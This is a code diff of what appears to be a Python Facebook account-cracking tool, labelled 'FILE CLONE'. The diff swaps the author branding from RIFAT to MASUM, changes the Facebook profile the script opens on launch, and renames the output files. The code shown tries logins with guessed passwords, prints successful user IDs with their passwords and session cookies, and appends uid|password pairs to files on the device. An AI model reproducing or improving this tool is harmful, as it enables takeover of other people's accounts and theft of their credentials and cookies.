@@ -163,7 +163,7 @@ ___  ___
 \033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD MASUM
 \033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MASUM 
 \033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD MASUM
-\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mMASUM
+\033[1;36m =[GITHUB]=  \033[1;36m   \033[1;36mMASUM Billah
 \033[1;36m =[TOOLS ]=     \033[1;36m\033[1;36mFILE    \033[1;36m(V~0.1)
 \033[1;36m═════════════════════════════════════════════════════════════
 """
@@ -176,8 +176,8 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100091953398314')
-        print('\033[1;36m=[\033[1;36m1\033[1;36m]= START RANDOM CLONE')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=61557310540905')
+        print('\033[1;36m=[\033[1;36m1\033[1;36m]= START FILE CLONE')
         print('\033[1;36m=[\033[1;36m0\033[1;36m]= EXIT')
         print('\033[1;36m═════════════════════════════════════════════════════════════')
         Shorif =input("\033[1;36m=[\033[1;36m??\033[1;36m]= CHOOSE : ")
@@ -276,15 +276,15 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\033[38;5;46m=[RIFAT-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
-                open('/sdcard/RIFAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f"\033[38;5;46m=[MASUM-OK💚]= {uid}|{ps}\n\033[1;32m=[COOKIE-💙]= \033[1;31m{coki}")
+                open('/sdcard/mt.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m=[RIFAT-LK💔]= {uid}|{ps}")
-                open('/sdcard/RIFAT-LK.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m=[MASUM💔]= {uid}|{ps}")
+                open('/sdcard/mx.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
